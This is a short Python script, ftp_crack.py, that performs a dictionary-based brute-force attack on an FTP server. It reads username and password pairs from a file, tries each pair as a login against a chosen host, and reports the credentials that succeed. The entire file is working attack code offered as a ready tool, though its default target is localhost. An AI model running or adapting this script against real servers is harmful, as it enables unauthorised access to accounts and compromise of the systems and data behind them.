#!/usr/bin/env python3
#
#  ftp_crack.py
#
#  Copyright 2014 Tim auf der Landwehr <dev@taufderl.de>
#
#  This script provides a dictionary based ftp attack
#
import ftplib
import sys
import getopt

# attack the ftp server at a certain hostname with a given dictionary
def attackFTP(hostname, dictionary):
  for username, password in dictionary:
    # for each username-password combination
    # in the dictionary try to connect to the ftp server
    try:
      ftp = ftplib.FTP(hostname)
      ftp.login(username, password)
      # if successful print the credentials, 
      # quit the connection and stop the attack
      print('[*] %s@%s (%s)\t'%(username, hostname, password) +'FTP Logon Succeeded.')
      ftp.quit()
      break
    except:
      # if not succeeded print message
      print('[*] %s@%s\t'%(username, hostname) +'FTP Logon Failed.')
      
# usage
def usage():
  print("\n ftp_crack.py by Tim auf der Landwehr")
  print()
  print(' Usage: ftp_crack.py')
  print('   > Brute Force attack on ftp server using dictionary of user credentials')
  print('')
  print(' --host [hostname]')
  print(' \tSet the hostname, default: localhost')
  print(' --dict [filename]')
  print(' \tSet the dictionary file, default: dictionary.txt')
  print(' -h --help')
  print(' \tShow this information')

# main
def main():
  try:
    opts, args = getopt.gnu_getopt(sys.argv[1:],"ho:v",["help", "host=", "dict="])
  except (getopt.GetoptError, NameError):
    usage()
    sys.exit()

  # defaults
  hostname = 'localhost'
  dict_file = 'dictionary.txt'

  # get parameters
  for o,v in opts:
    if o in ['--host']:
      hostname = v
    elif o in ['--dict']:
      dict_file = v
    elif o in ['-h','--help']:
      usage()
      sys.exit(1)
    else:
      print('unknown parameter %s'%o)
      sys.exit(1)

  # read dictionary from file 
  dictionary = []
  with open(dict_file, 'r') as file_content:
    for line in file_content.readlines():
      user, password = line.strip().split()
      dictionary.append( (user, password) )
  
  # start attack 
  attackFTP(hostname, dictionary)

      
if __name__ == "__main__":
  main()
